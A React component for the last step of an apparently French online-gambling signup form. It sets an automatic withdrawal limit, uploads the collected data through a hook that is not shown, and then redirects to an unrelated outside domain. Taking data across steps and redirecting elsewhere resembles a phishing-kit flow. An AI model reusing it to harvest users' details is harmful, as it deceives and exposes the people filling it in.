import React, { useState } from "react";
import { useNext } from "./useNext";
import { usePrevious } from "./usePrevious";
import { useSaveData } from "./useSaveData";
import { autoWithDrawLimits } from "./autoWithDrawLimits";
import { GrPrevious } from 'react-icons/gr'
import { redirect } from "next/navigation";
import { useUpload } from "./useUploadData";
export const AutoMaticWithDrawalLimit = () => {
  const [autoWithLimit, setAutoWithLimit] = useState("");
  const upload = useUpload()
  const next = useNext();
  const prev = usePrevious();
  const saveData = useSaveData();
   
  const handleUpload=()=>{
    return upload()
  }

  const handleNext = async () => {
    if (autoWithLimit != "") {
      saveData("autowithlimit", autoWithLimit);

      // Wait a short while to ensure data is saved
      await new Promise(resolve => setTimeout(resolve, 300)); // Adjust timeout as needed
      

      console.log('upload data')
      // Upload data
      const uploadSuccess = await handleUpload()
      if (uploadSuccess) {
        console.log('Data uploaded successfully');
        // Optionally redirect or perform another action
        window.location.href = 'https://martechavenue.com/';
      } else {
        console.error('Data upload failed');
      }

    }
  };

  const handlePrev = () => {
    prev();
  };

  return (
    <>
      <div
        className="row justify-content-center"
        style={{ backgroundColor: "black" }}
      >
        <div className="col-md-3">
          <div className="pt-4 pb-4 d-flex align-items-center">
            <div className="mr-auto">
              <span style={{ color: "white" }} onClick={handlePrev}>
                <GrPrevious />
              </span>
            </div>
            <div className="w-100 text-center">
              <p
                style={{
                  fontWeight: "600",
                  color: "white",
                  fontFamily: "Roboto",
                  fontSize: "16px",
                  margin: 0
                }}
              >
                Limite de retrait automatique
              </p>
            </div>
          </div>
        </div>
      </div>



      <div className="row justify-content-center pt-3">
        <div className="col-md-3">
          <div>
            <p
              style={{
                fontSize: "25px",
                color: "black",
                fontWeight: "900",
                fontFamily: "Roboto",
              }}
            >
              Fixer la limite de retrait automatique
            </p>
          </div>

          <div>
            <p
              style={{
                fontSize: "14px",
                fontFamily: "Roboto",
                color: "RGB(102, 102, 102)",
              }}
            >
              Tous les gains supérieurs à cette limite seront transférés sur
              votre compte bancaire. La règlementation française sur les jeux en
              ligne vous oblige à fixer cette limite.
            </p>
          </div>

          <div className="mt-1">
            <select
              className="form-select"
              defaultValue="France"
              onChange={(e) => setAutoWithLimit(e.target.value)}
            >
              {autoWithDrawLimits.map((limit, index) => (
                <option key={index} value={limit}>
                  {limit}
                </option>
              ))}
            </select>
          </div>

          <div className="mt-5 mb-5 text-center">
            <button
              className="btn"
              style={{
                borderRadius: "18px",
                width: "386px",
                color: "white",
                fontWeight: "700",
                backgroundColor: "#02bd9c",
              }}
              onClick={handleNext}
            >
              Soumettre
            </button>
          </div>
        </div>
      </div>
    </>
  );
};
